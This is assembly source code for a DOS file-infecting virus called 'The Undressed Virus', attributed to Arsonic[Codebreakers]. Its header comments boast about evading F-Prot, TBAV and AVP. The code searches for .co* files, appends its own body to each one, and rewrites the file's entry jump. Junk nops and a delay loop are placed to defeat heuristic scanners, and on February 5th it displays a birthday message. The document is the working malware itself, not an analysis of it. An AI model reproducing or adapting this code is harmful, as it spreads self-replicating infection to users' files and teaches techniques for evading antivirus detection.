; Virus: The Undressed Virus 
; Author: Arsonic[Codebreakers] 
; Type: Appending 
; Encryption: No 
; 
; Displays a Message on Feb 5th. 
; Btw.. I Love Lisa..! 
;--------------------------------------------------------------------------------------------------- 
;  AV-Product  |         Detected?      |            Comments 
;--------------------------------------------------------------------------------------------------- 
; F-Prot            |    No                        |  Easy to Get Past.. FPROT SUCKS! 
; TBAV             |    Unknown Virus   |  Well.. at least it aint say VCL! 
; AVP               |    VCL.824              |  VCL! ARRGGGHH! 
;---------------------------------------------------------------------------------------------------- 
db 0e9h,0,0 
start: 
call delta 
delta: 
pop bp 
sub bp,offset delta 
mov cx,0ffffh     ;kill heristics 
fprot_loopy: 
jmp back 
mov ax,4c00h 
int 21h 
back: 
loop fprot_loopy 
mov cx,3 
nop 
mov di,100h 
nop 
lea si,[bp+buffer] 
nop 
rep movsb 
find_first: 
mov ah,4ch 
add ah,2 
nop 
find_next: 
nop 
lea dx,[bp+filemask] 
nop 
int 21h 
jnc infect 
jmp check_payload 
infect: 
mov ax,3d02h 
mov dx,9eh 
int 21h 
xchg ax,bx 
mov ah,3dh 
add ah,2 
mov cx,3 
lea dx,[bp+buffer] 
int 21h 
mov ax,word ptr[80h + 1ah] 
nop 
sub ax,end - start + 3 
nop 
cmp ax,word ptr[bp+buffer+1] 
nop 
je close_file 
mov ax,word ptr[80h + 1ah] 
nop 
sub ax,3 
nop 
mov word ptr[bp+three+1],ax 
mov ax,4200h 
xor cx,cx 
cwd 
int 21h 
mov ah,3eh 
add ah,2 
nop 
lea dx,[bp+three] 
nop 
mov cx,3 
nop 
int 21h 
mov ax,4202h 
xor cx,cx 
cwd 
int 21h 
mov ah,3eh 
add ah,2 
nop 
lea dx,[bp+start] 
nop 
mov cx,end - start 
nop 
int 21h 
close_file: 
mov ah,3ch 
add ah,2 
int 21h 
mov ah,4dh 
add ah,2 
jmp find_next 
check_payload: 
mov ah,2ah 
int 21h 
cmp dh,2       ;is it febuary? 
je next 
jmp close 
next: 
cmp dl,5       ;the 5th? 
je payload     ;yes.. display the message 
jmp close      ;no.. return control to the program. 
payload: 
mov ah,9h ;display message 
lea dx,[bp+message] 
int 21h 
int 00h  ;get keypress 
int 16h 
int 20h  ;return to dos. 
close: 
mov di,100h   ;return control to program 
jmp di 
three db 0e9h,0,0 
filemask  db '*.co*',0     ;if *.com it would be detected as trival variant 
buffer    db 0cdh,20h,0 
virus     db 'The UnDreSSeD',0         ; messages to give those av'ers a 
author    db 'Arsonic[CB]',0           ; nice scan string.. 
message   db 'Happy Birthday Lisa!',10,13,'$' 
Lisa      db 'I LOVE U LISA!',0 
end: 